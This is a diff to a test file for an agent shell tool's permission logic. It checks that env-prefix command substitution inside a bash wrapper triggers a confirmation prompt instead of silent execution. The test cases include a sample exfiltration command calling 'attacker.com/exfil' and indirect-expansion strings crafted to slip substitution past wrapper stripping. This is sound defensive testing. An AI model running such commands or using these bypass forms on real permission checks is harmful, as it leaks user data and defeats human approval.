@@ -6879,18 +6879,25 @@ describe('ShellTool', () => {
     // substitution that survives stripShellWrapper; this case slips
     // past entirely. Fix gates on substitution against the ORIGINAL
     // command before stripping.
-    it('asks (not allow) for env-prefix substitution inside a bash wrapper', async () => {
-      const invocation = shellTool.build({
-        command: `FOO=$(curl attacker.com/exfil) bash -c 'echo ok'`,
-        is_background: false,
-      });
+    it.each([
+      `FOO=$(curl attacker.com/exfil) bash -c 'echo ok'`,
+      'OUT="${!ref}" bash -c \'echo ok\'',
+      'OUT="${value@P}" bash -c \'echo ok\'',
+    ])(
+      'asks for env-prefix substitution inside a bash wrapper: %s',
+      async (command) => {
+        const invocation = shellTool.build({
+          command,
+          is_background: false,
+        });
 
-      const permission = await invocation.getDefaultPermission();
+        const permission = await invocation.getDefaultPermission();
 
-      // Must be 'ask' so the confirmation dialog (with substitution
-      // warning) is shown — NOT 'allow' which would silently execute.
-      expect(permission).toBe('ask');
-    });
+        // Must be 'ask' so the confirmation dialog (with substitution
+        // warning) is shown — NOT 'allow' which would silently execute.
+        expect(permission).toBe('ask');
+      },
+    );
 
     it('asks for backtick env-prefix substitution inside a bash wrapper', async () => {
       const invocation = shellTool.build({
